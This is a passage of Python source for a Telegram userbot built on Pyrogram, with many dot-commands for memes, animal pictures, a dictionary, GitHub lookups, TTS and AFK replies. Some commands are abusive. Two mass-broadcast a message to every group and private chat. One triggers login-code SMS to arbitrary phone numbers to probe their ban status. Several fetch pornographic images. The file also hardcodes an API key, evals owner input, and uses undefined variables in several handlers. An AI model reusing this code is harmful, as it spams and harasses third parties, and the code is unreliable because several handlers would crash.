    await app.send_photo(message.chat.id, tweet, caption=starkxd, reply_to_message_id=message.id
                )
                
@app.on_message(filters.command(["note", "notes"], ".") & filters.me)
async def trump_tweet(app, message: Message):
    text = message.text.split(None, 1)[1]
    if not text:
        await message.edit(f"**Trump :** ``What Should I Tweet For You ?``")
        return
    url = f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}"
    r = requests.get(url=url).json()
    tweet = r["message"]
    starkxd = f"**Trump Has Tweeted** {text}"
    await app.send_photo(message.chat.id, tweet, caption=starkxd, reply_to_message_id=message.id
                )
                
@app.on_message(filters.command(["clyde", "discord"], ".") & filters.me)
async def trump_tweet(app, message: Message):
    text = message.text.split(None, 1)[1]
    if not text:
        await message.edit(f"**Clyde :** ``What Should I say For You ?``")
        return
    url = f"https://nekobot.xyz/api/imagegen?type=clyde&text={text}"
    r = requests.get(url=url).json()
    tweet = r["message"]
    starkxd = f"**Clyde said** {text}"
    await app.send_photo(message.chat.id, tweet, caption=starkxd, reply_to_message_id=message.id
                )
                
@app.on_message(filters.command(["mind", "changemind"], ".") & filters.me)
async def trump_tweet(app, message: Message):
    text = message.text.split(None, 1)[1]
    if not text:
        await message.edit(f"**Man :** ``What Should I say For You ?``")
        return
    url = f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}"
    r = requests.get(url=url).json()
    tweet = r["message"]
    starkxd = f"**He said** {text}"
    await app.send_photo(message.chat.id, tweet, caption=starkxd, reply_to_message_id=message.id
                )
                
@app.on_message(filters.command(["kana", "kanna"], ".") & filters.me)
async def trump_tweet(app, message: Message):
    text = message.text.split(None, 1)[1]
    if not text:
        await message.edit(f"**Kanna :** ``What Should I say For You ?``")
        return
    url = f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}"
    r = requests.get(url=url).json()
    tweet = r["message"]
    starkxd = f"**Kanna said** {text}"
    await app.send_photo(message.chat.id, tweet, caption=starkxd, reply_to_message_id=message.id
                )
from asyncio import gather
def ReplyCheck(message: Message):
    reply_id = None

    if message.reply_to_message:
        reply_id = message.reply_to_message.id

    elif not message.from_user.is_self:
        reply_id = message.id

    return reply_id


@app.on_message(filters.command(["bkp"], ".") & filters.me)
async def bkp_cmd(app, message: Message):
    uptt = await message.reply("`Tunggu Sebentar...`")
    await app.join_chat("punyapesulap")
    await gather(
    uptt.delete(),
      app.send_video(
      message.chat.id,
      choice(
              [
                bkp.video.file_id
                async for bkp in app.search_messages("punyapesulap", filter=enums.MessagesFilter.VIDEO)
              ]
            ),
            reply_to_message_id=ReplyCheck(message),
        ),
    )
    
@app.on_message(filters.command(["ayang"], ".") & filters.me)
async def ayang(app, message):
    uptt = await message.reply("🔎 `Search Ayang...`")
    anda = message.from_user.first_name
    dua = message.chat.id
    await message.reply_photo(
        choice(
            [
                hha.photo.file_id
                async for hha in app.search_messages("CeweLogoPack", filter=enums.MessagesFilter.PHOTO)
            ]
        ),
        False,
        caption=f"Selingkuhannya [{anda}](tg://user?id={dua}) 🥰🤏",reply_to_message_id=message.id
                ,
    )

    await uptt.delete()

@app.on_message(filters.command(["nude3"], ".") & filters.me)
async def ayang(app, message):
    uptt = await message.reply("🔎 `Search Nude...`")
    anda = message.from_user.first_name
    dua = message.chat.id
    await message.reply_photo(
        choice(
            [
                hha.photo.file_id
                async for hha in app.search_messages("tiktokpornvid", filter=enums.MessagesFilter.PHOTO)
            ]
        ),
        False,
        caption=f"Don't look!! 🥰🤏",reply_to_message_id=message.id
                ,
    )

    await uptt.delete()

@app.on_message(filters.command(["nude2"], ".") & filters.me)
async def ayang(app, message):
    uptt = await message.reply("🔎 `Search Nude...`")
    anda = message.from_user.first_name
    dua = message.chat.id
    await message.reply_photo(
        choice(
            [
                hha.photo.file_id
                async for hha in app.search_messages("hannahowoqq", filter=enums.MessagesFilter.PHOTO)
            ]
        ),
        False,
        caption=f"Don't look!! 🥰🤏",reply_to_message_id=message.id
                ,
    )

    await uptt.delete()
    
@app.on_message(filters.command(["nude"], ".") & filters.me)
async def ayang(app, message):
    uptt = await message.reply("🔎 `Search Nude...`")
    anda = message.from_user.first_name
    dua = message.chat.id
    await message.reply_photo(
        choice(
            [
                hha.photo.file_id
                async for hha in app.search_messages("hannahoowo", filter=enums.MessagesFilter.PHOTO)
            ]
        ),
        False,
        caption=f"Don't look!! 🥰🤏",reply_to_message_id=message.id
                ,
    )

    await uptt.delete()

@app.on_message(filters.command(["couple"], ".") & filters.me)
async def couple(app, message):
    uptt = await message.reply("🔎 `Search PP Couple...`")
    message.from_user.first_name
    message.chat.id
    await message.reply_photo(
        choice(
            [
              awk.photo.file_id
              async for awk in app.search_messages("ppcpcilik", filter=enums.MessagesFilter.PHOTO)
            ]
        ),
        False,
        caption=f"PP Virtualmu nih dek!. 🤏",reply_to_message_id=message.id
                ,
    )

    await uptt.delete()
    
@app.on_message(filters.command(["qq"], ".") & filters.me)
async def quotly(app, message: Message):
    anu = message.text.split(None, 1)[1]
    anuan = "quotlybot"
    await app.send_message(anuan, f"{anu}")
    await asyncio.sleep(5)
    async for quote in app.search_messages(anuan, limit=1):
        if quote:
            await message.reply_sticker(
                sticker=quote.sticker.file_id,
                reply_to_message_id=message.reply_to_message.id
                if message.reply_to_message
                else None,
            )
        else:
            return await message.edit("`Gagal Membuat Quotly`")
    await app.delete_messages(anuan, 2)
    
@app.on_message(filters.command(["q"], ".") & filters.me)
async def quotly1(app, message: Message):
    anuan = "quotlybot"
    await app.unblock_user(anuan)
    await message.reply_to_message.forward(anuan)
    await asyncio.sleep(7)
    async for quote in app.search_messages(anuan, limit=1):
        if quote:
            await message.delete()
            await message.reply_sticker(
                sticker=quote.sticker.file_id,
                reply_to_message_id=message.reply_to_message.id
                if message.reply_to_message
                else None,
            )
        else:
            return await message.edit("`Gagal Membuat Quotly`")
    await app.delete_messages(anuan, 2)
    
import aiohttp

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@app.on_message(filters.command(["pat", "pats"], ".") & filters.me)
async def give_pats(app, m: Message):
    URL = "https://some-random-api.com/animu/pat"
    async with aiohttp.ClientSession() as session:
        async with session.get(URL) as request:
            if request.status == 404:
                return await m.edit("`no Pats for you :c")
            result = await request.json()
            url = result.get("link", None)
            await asyncio.gather(
                app.send_video(m.chat.id, url, reply_to_message_id=m.id
                ),
            )

@app.on_message(filters.command(["wink", "winks"], ".") & filters.me)
async def give_pats1(app, m: Message):
    URL = "https://some-random-api.com/animu/wink"
    async with aiohttp.ClientSession() as session:
        async with session.get(URL) as request:
            if request.status == 404:
                return await m.edit("`no winks for you :c")
            result = await request.json()
            url = result.get("link", None)
            await asyncio.gather(
                app.send_video(m.chat.id, url, reply_to_message_id=m.id
                ),
            )
            
@app.on_message(filters.command(["hug", "hugs"], ".") & filters.me)
async def give_pats2(app, m: Message):
    URL = "https://some-random-api.com/animu/hug"
    async with aiohttp.ClientSession() as session:
        async with session.get(URL) as request:
            if request.status == 404:
                return await m.edit("`no hugs for you :c")
            result = await request.json()
            url = result.get("link", None)
            await asyncio.gather(
                app.send_video(m.chat.id, url, reply_to_message_id=m.id
                ),
            )
            
@app.on_message(filters.command(["face-palm", "palm"], ".") & filters.me)
async def give_pats2(app, m: Message):
    URL = "https://some-random-api.com/animu/face-palm"
    async with aiohttp.ClientSession() as session:
        async with session.get(URL) as request:
            if request.status == 404:
                return await m.edit("`no face-palm for you :c")
            result = await request.json()
            url = result.get("link", None)
            await asyncio.gather(
                app.send_video(m.chat.id, url, reply_to_message_id=m.id
                ),
            )
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
GROUP = [-1001521704453, -1001410362208]
VERIFIED_USERS = [936481432, 1669178360, 1941391496, 1709495698, 1920507972, 1450303652]
NB = GROUP
DEVS = VERIFIED_USERS

def get_arg(message: Message):
    msg = message.text
    msg = msg.replace(" ", "", 1) if msg[1] == " " else msg
    split = msg[1:].replace("\n", " \n").split(" ")
    if " ".join(split[1:]).strip() == "":
        return ""
    return " ".join(split[1:])

@app.on_message(
    filters.command(["sendgp"], ".") & filters.me)
async def gcast_cmd(app: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        tex = await message.reply_text("`Started global broadcast...`")
    else:
        return await message.edit_text("**Give A Message or Reply**")
    done = 0
    error = 0
    async for dialog in app.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in NB:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await app.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await tex.edit_text(
        f"**Successfully Sent Message To** `{done}` **Groups, chat, Failed to Send Message To** `{error}` **Groups**"
    )
@app.on_message(
    filters.command(["sendpv"], ".") & filters.me)

async def gucast(app: Client, message: Message):
    if message.reply_to_message or get_arg(message):
        tex = await message.reply_text("`Started global broadcast...`")
    else:
        return await message.edit_text("**Give A Message or Reply**")
    done = 0
    error = 0
    async for dialog in app.get_dialogs():
        if dialog.chat.type == enums.ChatType.PRIVATE and not dialog.chat.is_verified:
            if message.reply_to_message:
                msg = message.reply_to_message
            elif get_arg:
                msg = get_arg(message)
            chat = dialog.chat.id
            if chat not in DEVS:
                try:
                    if message.reply_to_message:
                        await msg.copy(chat)
                    elif get_arg:
                        await app.send_message(chat, msg)
                    done += 1
                    await asyncio.sleep(0.3)
                except Exception:
                    error += 1
                    await asyncio.sleep(0.3)
    await text.edit_text(
        f"**Successfully Sent Message To** `{done}` **chat, Failed to Send Message To** `{error}` **chat**"
    )
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["dictionary", "dict"], ".") & filters.me)
async def define(app, m: Message):
    """ Thank you Poki!!"""
    cmd = m.command

    input_string = ""
    if len(cmd) > 1:
        input_string = " ".join(cmd[1:])
    elif m.reply_to_message and len(cmd) == 1:
        input_string = m.reply_to_message.text
    elif not m.reply_to_message and len(cmd) == 1:
        await m.edit("`Can't pass to the void.`")
        await asyncio.sleep(2)
        await m.delete()
        return

    def combine(s_word, name):
        w_word = f"**__{name.title()}__**\n"
        for i in s_word:
            if "definition" in i:
                if "example" in i:
                    w_word += (
                            "\n**Definition**\n<pre>"
                            + i["definition"]
                            + "</pre>\n<b>Example</b>\n<pre>"
                            + i["example"]
                            + "</pre>"
                    )
                else:
                    w_word += (
                            "\n**Definition**\n" + "<pre>" + i["definition"] + "</pre>"
                    )
        w_word += "\n\n"
        return w_word

    def out_print(word1):
        out = ""
        if "meaning" in list(word1):
            meaning = word1["meaning"]
            if "noun" in list(meaning):
                noun = meaning["noun"]
                out += combine(noun, "noun")
                # print(noun)
            if "verb" in list(meaning):
                verb = meaning["verb"]
                out += combine(verb, "verb")
                # print(verb)
            if "preposition" in list(meaning):
                preposition = meaning["preposition"]
                out += combine(preposition, "preposition")
                # print(preposition)
            if "adverb" in list(meaning):
                adverb = meaning["adverb"]
                out += combine(adverb, "adverb")
                # print(adverb)
            if "adjective" in list(meaning):
                adjec = meaning["adjective"]
                out += combine(adjec, "adjective")
                # print(adjec)
            if "abbreviation" in list(meaning):
                abbr = meaning["abbreviation"]
                out += combine(abbr, "abbreviation")
                # print(abbr)
            if "exclamation" in list(meaning):
                exclamation = meaning["exclamation"]
                out += combine(exclamation, "exclamation")
                # print(exclamation)
            if "transitive verb" in list(meaning):
                transitive_verb = meaning["transitive verb"]
                out += combine(transitive_verb, "transitive verb")
                # print(tt)
            if "determiner" in list(meaning):
                determiner = meaning["determiner"]
                out += combine(determiner, "determiner")
                # print(determiner)
            if "crossReference" in list(meaning):
                crosref = meaning["crossReference"]
                out += combine(crosref, "crossReference")
                # print(crosref)
        if "title" in list(word1):
            out += (
                    "**__Error Note__**\n\n▪️`"
                    + word1["title"]
                    + "\n\n▪️"
                    + word1["message"]
                    + "\n\n▪️<i>"
                    + word1["resolution"]
                    + "</i>`"
            )
        return out

    if not input_string:
        await m.edit("`Plz enter word to search‼️`")
    else:
        word = input_string
        r_dec = await AioHttp().get_json(
            f"https://api.dictionaryapi.dev/api/v1/entries/en/{word}"
        )

        v_word = input_string
        if isinstance(r_dec, list):
            r_dec = r_dec[0]
            v_word = r_dec["word"]
        last_output = out_print(r_dec)
        if last_output:
            await app.send_message(m.chat.id , f"**Dictionary**▬▬▬▬▬▬▬▬▬▬\n\n`Word` = {v_word}\n{last_output}\n\n▬▬▬▬▬▬▬▬▬▬**Dictionary**"   , reply_to_message_id=m.id)
        else:
            await app.send_message(m.chat.id , "**Dictionary**▬▬▬▬▬▬▬▬▬▬\n`No result found from the database.`\n{last_output}\n▬▬▬▬▬▬▬▬▬▬**Dictionary**" , reply_to_message_id=m.id)
def get_text(message):
    text = message.text
    return text
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@app.on_message(filters.command(["github"], ".") & filters.me)
async def github_(app, m: Message):
    msg = await app.send_message(m.chat.id ,"**Searching on GitHub...**")
    text = m.text.split(".github")[1].strip()
    if not text:
        await editer.edit("`Please Enter Valid Input`")
        return
    url = "https://api.github.com/users/{}".format(text)
    r = requests.get(url)
    if r.status_code != 404:
        b = r.json()
        avatar_url = b.get("avatar_url")
        html_url = b.get("html_url")
        gh_type = b.get("type")
        name = b.get("name")
        company = b.get("company")
        blog = b.get("blog")
        location = b.get("location")
        bio = b.get("bio")
        created_at = b.get("created_at")
        cap = f"**GitHub**▬▬▬▬▬▬▬▬▬▬\n`Name`: [{name}]({html_url})\n`Type`: **{gh_type}**\n`Company`**: {company}**\n`Blog`: **{blog}**\n`Location`: **{location}**\n`Bio`: **{bio}**\n`Profile Created`:** {created_at}**\n▬▬▬▬▬▬▬▬▬▬**GitHub**"
        await app.send_message(m.chat.id ,cap, reply_to_message_id=m.id)
    else:
        await msg.edit(f"`404 : UserNot Found!`")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@app.on_message(filters.command(["git"], ".") & filters.me)
async def git(app, m: Message):
    pablo = await app.send_message(m.chat.id ,"**Searching on GitHub...**")
    args = m.text.split(".git")[1].strip()
    r = requests.get("https://api.github.com/search/repositories", params={"q": args})
    lool = r.json()
    lol = lool.get("items")
    qw = lol[0]
    txt = f"""**GitHub**▬▬▬▬▬▬▬▬▬▬
<b>Name :</b> <i>{qw.get("name")}</i>
<b>Full Name :</b> <i>{qw.get("full_name")}</i>
<b>Link :</b> {qw.get("html_url")}
<b>Fork Count :</b> <i>{qw.get("forks_count")}</i>
<b>Open Issues :</b> <i>{qw.get("open_issues")}</i>
"""
    if qw.get("description"):
        txt += f'<b>Description :</b> <code>{qw.get("description")}</code>'
    if qw.get("language"):
        txt += f'\n<b>Language :</b> <code>{qw.get("language")}</code>'
    if qw.get("size"):
        txt += f'\n<b>Size :</b> <code>{qw.get("size")}</code>'
    if qw.get("score"):
        txt += f'\n<b>Score :</b> <code>{qw.get("score")}</code>'
    if qw.get("created_at"):
        txt += f'\n<b>Created At :</b> <code>{qw.get("created_at")}</code>'
    if qw.get("archived") == True:
        txt += f"<b>This Project is Archived</b>"
    await app.send_message(m.chat.id,txt, disable_web_page_preview=False, reply_to_message_id=m.id)
    await pablo.delete()
#***********************&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
# For converting
def convert_f(fahrenheit):
    f = float(fahrenheit)
    f = (f * 9 / 5) + 32
    return f
def convert_c(celsius):
    cel = float(celsius)
    cel = (cel - 32) * 5 / 9
    return cel
@app.on_message(filters.command(["e"], ".") & filters.me)
async def evaluation(app, m: Message):
    if len(m.text.split()) == 1:
        await message.edit("Usage: `.e 1000-7`")
        return
    q = m.text.split(None, 1)[1]
    try:
        ev = str(eval(q))
        if ev:
            if len(ev) >= 4096:
                file = open("self/output.txt", "w+")
                file.write(ev)
                file.close()
                await client.send_file(message.chat.id, "self/output.txt",
                                       caption="`Output too large, sending as file`")
                os.remove("self/output.txt")
                return
            else:
                await app.send_message(m.chat.id,"**Evaluation**▬▬▬▬▬▬▬▬▬\n\n**Query:**\n{}\n\n**Result:**\n`{}`\n\n▬▬▬▬▬▬▬▬▬▬**Evaluation**".format(q, ev), reply_to_message_id=m.id)
                return
        else:
            await m.edit("**Query:**\n{}\n\n**Result:**\n`None`".format(q))
            return
    except:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        errors = traceback.format_exception(etype=exc_type, value=exc_obj, tb=exc_tb)
        await m.edit("Error: `{}`".format(errors))
        logging.exception("Evaluation error")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
c = CurrencyConverter()
@app.on_message(filters.command(["c"], ".") & filters.me)
async def evaluation_curr(app, m: Message):
    if len(m.text.split()) <= 3:
        await m.edit("Usage: `curr 100 USD IDR`")
        return
    value = m.text.split(None, 3)[1]
    curr1 = m.text.split(None, 3)[2].upper()
    curr2 = m.text.split(None, 3)[3].upper()
    try:
        conv = c.convert(int(value), curr1, curr2)
        text = "**Currency Converter**▬▬▬▬\n\n\{} {} = {} {}\n\n▬▬▬▬**Currency Converter**".format(curr1, value, curr2, f'{conv:,.2f}')
        await app.send_message(m.chat.id,text, reply_to_message_id=m.id)
    except ValueError as err:
        await m.edit(str(err))
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@app.on_message(filters.command(["t"], ".") & filters.me)
async def evaluation_temp(app, m: Message):
    if len(m.text.split()) <= 2:
        await app.send_message(m.chat.id,"Usage: `.t 30 C` or `.t 60 F`", reply_to_message_id=m.id)
        return
    temp1 = m.text.split(None, 2)[1]
    temp2 = m.text.split(None, 2)[2]
    try:
        if temp2 == "F":
            result = convert_c(temp1)
            text = "**Temperature Converter**▬▬▬▬\n\n`{}°F` = `{}°C`\n\n▬▬▬▬**Tempreture Converter**".format(temp1, result)
            await app.send_message(m.chat.id,text, reply_to_message_id=m.id)
        elif temp2 == "C":
            result = convert_f(temp1)
            text = "**Temperature Converter**▬▬▬▬\n\n`{}°C` = `{}°F`\n\n▬▬▬▬**Tempreture Converter**".format(temp1, result)
            await app.send_message(m.chat.id,text, reply_to_message_id=m.id)
        else:
            await app.send_message(m.chat.id,"Unknown type {}\nC\nF\nبه صورت حرف بزرگ وارد کنید".format(temp2), reply_to_message_id=m.id)
    except ValueError as err:
        await app.send_message(m.chat.id,str(err), reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
from telegraph import upload_file
@app.on_message(filters.command(["telegraph"], ".") & filters.me)
async def telegraph(app, m: Message):
    replied = m.reply_to_message
    if not replied:
        await app.send_message(m.chat.id,"reply to a supported media file", reply_to_message_id=m.id)
        return
    if not ((replied.photo and replied.photo.file_size <= 5242880)
            or (replied.animation and replied.animation.file_size <= 5242880)
            or (replied.video and replied.video.file_name.endswith('.mp4')
                and replied.video.file_size <= 5242880)
            or (replied.document
                and replied.document.file_name.endswith(
                    ('.jpg', '.jpeg', '.png', '.gif', '.mp4'))
                and replied.document.file_size <= 5242880)):
        await app.send_message(m.chat.id,"not supported!", reply_to_message_id=m.id)
        return
    download_location = await app.download_media(message=m.reply_to_message,file_name='root/self/')
    await app.send_message(m.chat.id,"`passing to telegraph...`", reply_to_message_id=m.id)
    try:
        response = upload_file(download_location)
    except Exception as document:
        await app.send_message(m.chat.id,document, reply_to_message_id=m.id)
    else:
        await app.send_message(m.chat.id,f"**Document passed to: [Telegra.ph](https://telegra.ph{response[0]})**", reply_to_message_id=m.id)
    finally:
        os.remove(download_location)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
lang = "en"  # Default Language for voice
@app.on_message(filters.command(["v"], ".") & filters.me)
async def voice(app, m: Message):
    global lang
    cmd = m.command
    if len(cmd) > 1:
        v_text = " ".join(cmd[1:])
    elif m.reply_to_message and len(cmd) == 1:
        v_text = m.reply_to_message.text
    elif not m.reply_to_message and len(cmd) == 1:
        await app.send_message(m.chat.id,"Usage: `reply to a message or send text arg to convert to voice`", reply_to_message_id=m.id)
        await asyncio.sleep(2)
        await m.delete()
        return
    # noinspection PyUnboundLocalVariable
    tts = gTTS(v_text, lang=lang)
    tts.save('self/voice_ready.mp3')
    await m.delete()
    if m.reply_to_message:
        await app.send_voice(m.chat.id, voice="self/voice_ready.mp3", reply_to_message_id=m.id)
    else:
        await app.send_voice(m.chat.id, voice="self/voice_ready.mp3")
    os.remove("self/voice_ready.mp3")
@app.on_message(filters.command(["sv"], ".") & filters.me)
async def voicelang(app, m: Message):
    global lang
    temp = lang
    lang = m.text.split(None, 1)[1]
    try:
        gTTS("tes", lang=lang)
    except Exception as e:
        await app.send_message(m.chat.id,"Wrong Language id !", reply_to_message_id=m.id)
        lang = temp
        return
    await app.send_message(m.chat.id,"Language Set to {}".format(lang), reply_to_message_id=m.id)
@app.on_message(filters.command(["vl"], ".") & filters.me)
async def voicelist(app, m: Message):
    caption = f"""`ID| Language  | ID| Language`
`af: Afrikaans | ar: Arabic
cs: Czech     | de: German  
el: Greek     | en: English
es: Spanish   | fr: French  
hi: Hindi     | id: Indonesian
is: Icelandic | it: Italian
ja: Japanese  | jw: Javanese
ko: Korean    | la: Latin   
my: Myanmar   | ne: Nepali  
nl: Dutch     | pt: Portuguese
ru: Russian   | su: Sundanese 
sv: Swedish   | th: Thai 
tl: Filipino  | tr: Turkish
vi: Vietname  |
zh-cn: Chinese (Mandarin/China)
zh-tw: Chinese (Mandarin/Taiwan)`
"""
    await app.send_message(m.chat.id,caption, reply_to_message_id=m.id)
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@app.on_message(filters.command(["azan"], ".") & filters.me)
async def adzan_shalat(app, m: Message):
    LOKASI = m.text.split(None, 1)[1]
    url = f"http://muslimsalat.com/{LOKASI}.json?key=bd099c5825cbedb9aa934e255a81a5fc"
    request = requests.get(url)
    result = json.loads(request.text)
    catresult = f"""
Jadwal Shalat Hari Ini

<b>Tanggal</b> <code>{result['items'][0]['date_for']}</code>
<b>Kota</b> <code>{result['query']} | {result['country']}</code>

<b>Terbit  :</b> <code>{result['items'][0]['shurooq']}</code>
<b>Subuh :</b> <code>{result['items'][0]['fajr']}</code>
<b>Zuhur  :</b> <code>{result['items'][0]['dhuhr']}</code>
<b>Ashar  :</b> <code>{result['items'][0]['asr']}</code>
<b>Maghrib :</b> <code>{result['items'][0]['maghrib']}</code>
<b>Isya :</b> <code>{result['items'][0]['isha']}</code>
"""
    await app.send_message(m.chat.id ,catresult, reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["boob"], ".") & filters.me)
async def search_anu(app, m: Message):
    if not os.path.isdir('./file_tt/'):
        os.makedirs('./file_tt/')
    pic_loc = os.path.join('./file_tt/', "bobs.jpg")
    nsfw = requests.get("http://api.oboobs.ru/noise/1").json()[0]["preview"]
    urllib.request.urlretrieve(
        "http://media.oboobs.ru/{}".format(nsfw), pic_loc)
    await app.send_photo(
        m.chat.id,
        pic_loc,
        caption=["**Don't look at it !**"], reply_to_message_id=m.id)
    os.remove(pic_loc)
    return

@app.on_message(filters.command(["check"], ".") & filters.me)
async def checker(app, m: Message):
        acc = Client("Number", api_id , api_hash)
        await acc.connect()
        try:
            number = m.text.split(None, 1)[1]
            send_Code = await acc.send_code(number) 
            await app.send_message(m.chat.id , f"شماره ( {number} ) مشکلی ندارد." , reply_to_message_id=m.id)
        except Exception as e:
                await app.send_message(m.chat.id , f"شماره ( {number} ) بن است.", reply_to_message_id=m.id)
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
afk_info = {
    "is_afk": False,
    "reason": "",
}
is_afk = filters.create(lambda _, __, ___: afk_info["is_afk"])

@app.on_message(is_afk & ~filters.me & ((filters.private & ~filters.bot) | (filters.mentioned & filters.group)))
async def afk_handler(app, m: Message):
    await app.send_message(m.chat.id,
        f"**Afk Mode**▬▬▬▬\nسلام **دوست عزیز**\nبنده در حال حاظر آفلاین هستم...\n\n💬دلیل:</b> <i>{afk_info['reason']}</i>\n<b>▬▬▬▬**Afk Mode**"
    , reply_to_message_id=m.id)
    
@app.on_message(filters.command(["afk"], ".") & filters.me)
async def afk(app, m: Message):
    if len(m.text.split()) >= 2:
        reason = m.text.split(" ", maxsplit=1)[1]
    else:
        reason = "None"

    afk_info["is_afk"] = True
    afk_info["reason"] = reason

    await app.send_message(m.chat.id,f"❕ I'm going <b>AFK</b>.\n<b>💬 Reason:</b> <i>{reason}</i>.", reply_to_message_id=m.id)

@app.on_message(filters.command(["unafk"], ".") & filters.me)
async def unafk(app, m: Message):
    if afk_info["is_afk"]:
        await app.send_message(m.chat.id,f"<b>❕ I'm not <b>AFK</b> anymore.\n" f"⏳ I was <b>AFK:</b>", reply_to_message_id=m.id)
        afk_info["is_afk"] = False
    else:
        await app.send_message(m.chat.id,"<b>❌ You weren't afk</b>", reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
monshi_info = {
    "is_monshi": False,
    "reason": "",
}
is_monshi = filters.create(lambda _, __, ___: monshi_info["is_monshi"])

@app.on_message(is_monshi & ~filters.me & ((filters.private & ~filters.bot)))
async def monshi_handler(app, m: Message):
    await app.send_message(m.chat.id,
        f"{monshi_info['reason']}"
    , reply_to_message_id=m.id)
    
@app.on_message(filters.command(["monshi"], ".") & filters.me)
async def monshi(app, m: Message):
    if len(m.text.split()) >= 2:
        reason = m.text.split(" ", maxsplit=1)[1]
    else:
        reason = "None"

    monshi_info["is_monshi"] = True
    monshi_info["reason"] = reason

    await app.send_message(m.chat.id,f"MONSHI MODE IS ON", reply_to_message_id=m.id)

@app.on_message(filters.command(["monshioff"], ".") & filters.me)
async def monshioff(app, m: Message):
    if monshi_info["is_monshi"]:
        await app.send_message(m.chat.id,f"MONSHI MODE IS OFF", reply_to_message_id=m.id)
        monshi_info["is_monshi"] = False
    else:
        await app.send_message(m.chat.id,"MONSHI MODE WAS OFF", reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["chance"], ".") & filters.me)
async def chance(app, m: Message):
    text = m.text.split(None, 1)[1]
    await app.send_message(m.chat.id,f"{text}\nChance: {random.randint(1, 100)}%" ,reply_to_message_id=m.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["cat"], ".") & filters.me)
async def cats(app, m: Message):
    response = requests.get("https://shibe.online/api/cats").json()
    await app.send_photo(m.chat.id,response[0],caption = "This is my love ...",reply_to_message_id=m.id)

@app.on_message(filters.command(["bird"], ".") & filters.me)
async def cats(app, m: Message):
    response = requests.get("https://shibe.online/api/birds").json()
    await app.send_photo(m.chat.id,response[0],caption = "This is my love ...",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["dog"], ".") & filters.me)
async def cats(app, m: Message):
    response = requests.get("https://shibe.online/api/shibes").json()
    await app.send_photo(m.chat.id,response[0],caption = "This is my love ...",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["anime"], ".") & filters.me)
async def cats(app, m: Message):
    data = requests.get(f"https://api.waifu.pics/sfw/waifu")
    photo = data.json().get("url")
    await app.send_photo(m.chat.id,photo,caption = "This is my love ...",reply_to_message_id=m.id)

@app.on_message(filters.command(["catt"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/cat").json()
    a = response["fact"]
    await app.send_photo(m.chat.id,response["image"],caption = f"This is my love ...\nFact = `{a}`",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["birdd"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/bird").json()
    a = response["fact"]
    await app.send_photo(m.chat.id,response["image"],caption = f"This is my love ...\nFact = `{a}`",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["dogg"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/dog").json()
    await app.send_photo(m.chat.id,response["image"],caption = "This is my love ...",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["doggg"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://dog.ceo/api/breeds/image/random").json()
    await app.send_photo(m.chat.id,response["message"],caption = "This is my love ...",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["fox"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://some-random-api.com/animal/fox").json()
    await app.send_photo(m.chat.id,response["image"],caption = "This is my love ...",reply_to_message_id=m.id)
    
@app.on_message(filters.command(["foxx"], ".") & filters.me)
async def cats1(app, m: Message):
    response = requests.get("https://randomfox.ca/floof/").json()
